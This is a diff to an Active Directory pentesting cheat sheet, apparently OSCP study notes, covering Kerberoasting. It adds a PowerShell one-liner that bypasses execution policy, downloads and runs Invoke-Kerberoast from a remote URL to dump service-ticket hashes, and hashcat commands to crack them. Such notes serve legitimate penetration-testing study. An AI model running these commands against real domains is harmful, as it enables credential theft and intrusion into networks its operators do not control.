@@ -6,6 +6,7 @@
 - https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
 - https://github.com/Sp4c3Tr4v3l3r/OSCP/blob/main/Active%20Directory.md
 - https://cheatsheet.haax.fr/windows-systems/exploitation/kerberos/
+- https://blog.certcube.com/kerberoasting-simplified-attack-and-defense/
 
 # Table of Content
 - [Active Directory Pentesting](#active-directory-pentesting)
@@ -254,12 +255,9 @@ Three step process:
 </aside>
 
 ```bash
-#obtain TGS
-impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request #from kali machine
-
-#using Rubeus once you have krbtgs hash
-.\Rubeus.exe kerberoast /outfile:hashes.kerberoast #dumping from compromised windows host, and saving with customname
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
 
 # cracking TGS hashes
-hashcat -m 13100 hashes.txt wordlist.txt --force 
+hashcat -m 13100 kerb-Hash0.txt wordlist.txt --force
+        hashcat64.exe -m 13100 "C:\Users\test\Documents\Kerb1.txt" C:\Users\test\Documents\Wordlists\Rocktastic12a --outfile="C:\Users\test\Documents\CrackedKerb1.txt"
 ```
